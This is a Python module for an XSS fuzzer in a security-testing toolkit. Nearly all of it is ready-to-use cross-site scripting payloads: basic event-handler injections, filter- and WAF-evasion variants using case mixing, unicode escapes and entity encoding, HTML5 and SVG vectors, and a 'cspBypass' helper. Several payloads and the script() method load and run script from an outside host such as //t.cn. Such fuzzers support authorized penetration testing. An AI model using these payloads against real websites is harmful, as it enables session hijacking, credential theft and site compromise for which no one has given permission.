#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>
%s
</body>
</html>
'''

# probe for test xss vuln
_probes = [
    """'';!--"<XSS>=&{()}""",
]

# xss payloads
_payloads = [
    '<q/oncut=open()>',
    '<svg/onload=eval(name)>',
    '<svg/onload=eval(window.name)>',
    '<svg/onload=eval(location.hash.slice(1))>',
    '<img src=x onerror=alert(/xss/)>',
    """<img src="javascript:alert('xss');">""",
    """<style>@im\\port'\\ja\\vasc\\ript:alert("xss")';</style>""",
    """<img style="xss:expr/*xss*/ession(alert('xss'))"> """,
    """<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">""",
    """<meta http-equiv="refresh" content="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">""",
    """<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"""
]

# reg test payloads
_reg_payloads = [
    # no reg
    "<svg",
    # <[a-z]+
    "<dev",
    # ^<[a-z]+
    "x<dev",
    # <[a-zA-Z]+
    "<dEv",
    # <[a-zA-Z0-9]+
    "<d3V",
    # <.+
    "<d|3v ",
]

# payload for waf test
_waf_payloads = [
    "<IMG SRC=JaVaScRiPt:alert('xss')>",
    '<<script>alert("xss");//<</script>',
    """<img src="javascript:alert('xss')" """,
    '<a href="javascript%26colon;alert(1)">click',
    '<a href=javas&#99;ript:alert(1)>click',
    '<--`<img/src=` onerror=confirm``> --!>',
    '\'"</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//t.cn>',
    '<embed//sRc=//t.cn>',
    '<base href=//t.cn/><script src=/>',
    '<object//data=//t.cn>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>',
    '<scriscriptpt>alert(/xss/)</scriscriptpt>',
    '¼script¾alert(¢XSS¢)¼/script¾',
    '<a"/onclick=(confirm)()>click',
    '<a/href=javascript&colon;alert()>click',
    '<a/href=&#74;ava%0a%0d%09script&colon;alert()>click',
    '<d3v/onauxclick=[2].some(confirm)>click',
    '<d3v/onauxclick=(((confirm)))">click',
    '<d3v/onmouseleave=[2].some(confirm)>click',
    '<details/open/ontoggle=alert()>',
    '<details/open/ontoggle=(confirm)()//'
]

# payload with html 5 features
# http://html5sec.org
_h5payloads = [
    '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',
    '<video><source onerror="alert(1)">',
    '<video onerror="alert(1)"><source></source></video>',
    '<form><button formaction="javascript:alert(1)">X</button>',
    '<math href="javascript:alert(1)">CLICKME</math>',
    '<link rel="import" href="test.svg" />',
    '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />',
]

_svg_payload = '''<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 105">
<html>
    <head>
        <title>test</title>
    </head>
    <body>
        <script>alert('xss');</script>
    </body>
</html>
</svg>'''

class XSS(Fuzzer):

    """generate XSS payload"""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate
    probes = _probes
    payloads = _payloads
    reg_payloads = _reg_payloads
    waf_payloads = _waf_payloads
    h5payloads = _h5payloads

    def __init__(self, url=""):
        """
        url: xss payload url
        """
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return "<script>alert(/xss/)</script>"

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src="x"' % t
            for e in cls.events:
                s += ''' %s="console.log('%s %s')" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    @classmethod
    def acmehttp01(cls, url):
        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/
        return url + '/.well-known/acme-challenge/?<h1>hi'

    @classmethod
    def img(cls, payload):
        return '<img/onerror="%s"/src=x>' % payload

    @classmethod
    def svg(cls, payload):
        return '<svg/onload="%s"/>' % payload

    @classmethod
    def style(cls, payload):
        return '<style/onload="%s"></style>' % payload

    @classmethod
    def input(cls, payload):
        return '<input/onfocus="%s"/autofocus>' % payload

    @classmethod
    def marquee(cls, payload):
        return '<marquee/onstart="%s"></marquee>' % payload

    @classmethod
    def div(cls, payload):
        return '<div/onwheel="%s"/style="height:200%;width:100%"></div>' % payload

    @classmethod
    def template(cls, tag="img", delimiter=" ", event_handler="onerror", javascript="alert(/xss/)", ending=">"):
        '''
        delimiter " "
        delimiter "\x09"
        delimiter "\x09\x09"
        delimiter "/"
        delimiter "\x0a"
        delimiter "\x0d"
        delimiter "/~/"
        ending ">"
        ending "//"
        ending " "
        ending "\t"
        ending "\n"
        '''
        return f"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}"

    def script(self):
        payload = "<script src='%s'></script>" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = "<%s src=" % element
        payload += '"%s" ' % src
        payload += event
        payload += "=%s >" % js
        return payload

    def cspBypass(self):
        return "<link rel='preload' href='%s'>" % self.url
